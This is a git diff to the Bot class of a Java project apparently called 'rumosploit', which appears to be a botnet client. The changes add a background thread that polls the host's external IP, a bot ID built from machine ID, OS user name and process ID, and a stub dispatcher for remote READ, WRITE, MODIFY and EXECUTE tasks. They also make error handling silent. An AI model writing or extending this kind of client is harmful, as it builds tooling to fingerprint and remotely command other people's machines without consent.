@@ -21,6 +21,9 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;
 import com.github.rumoel.rumosploit.bot.header.Header;
 import com.github.rumoel.rumosploit.bot.network.packet.ReadyPacket;
+import com.github.rumoel.rumosploit.tasks.Task;
+import com.github.rumoel.rumosploit.tasks.Task.type;
+import com.github.rumoel.rumosploit.utils.ExternalDataGetter;
 
 public class Bot extends Thread {
 
@@ -54,7 +57,31 @@ public class Bot extends Thread {
 
 	private void startThreads() {
 		startDataGetter();
+
+		startIpGetter();
+
 		startDataSender();
+	}
+
+	private void startIpGetter() {
+		new Thread(() -> {
+			do {
+				try {
+					String ip = ExternalDataGetter.getExternalIP();
+					if (ip != null) {
+						Header.setExternalIP(ip);
+					}
+				} catch (Exception e1) {
+					// IGNORE
+				}
+				try {
+					Thread.sleep(300000);
+				} catch (Exception e2) {
+					// IGNORE
+				}
+			} while (true);
+
+		}, "externalIpGetter").start();
 	}
 
 	private void startDataGetter() {
@@ -95,6 +122,7 @@ public class Bot extends Thread {
 			int pid = Integer.parseInt(pidHostName.split("@")[0]);
 			data.setPid(pid);
 		}
+		data.setExternalIP(Header.getExternalIP());
 
 		data.setBotId(data.getMachineId() + ":" + data.getOsUserName() + ":" + data.getPid());
 	}
@@ -127,7 +155,7 @@ public class Bot extends Thread {
 			}
 			return id;
 		} catch (Exception e) {
-			e.printStackTrace();
+			// IGNORE (try other)
 		}
 		// by process
 		return null;
@@ -182,6 +210,27 @@ public class Bot extends Thread {
 
 		ReadyPacket ready = new ReadyPacket();
 		Header.getSession().write(ready);
+	}
+
+	public static void executeTask(Task task) {
+		type type = task.getTasktype();
+		switch (type) {
+		case READ:
+
+			break;
+		case WRITE:
+
+			break;
+		case MODIFY:
+
+			break;
+		case EXECUTE:
+
+			break;
+
+		default:
+			break;
+		}
 	}
 
 	public void reload() {
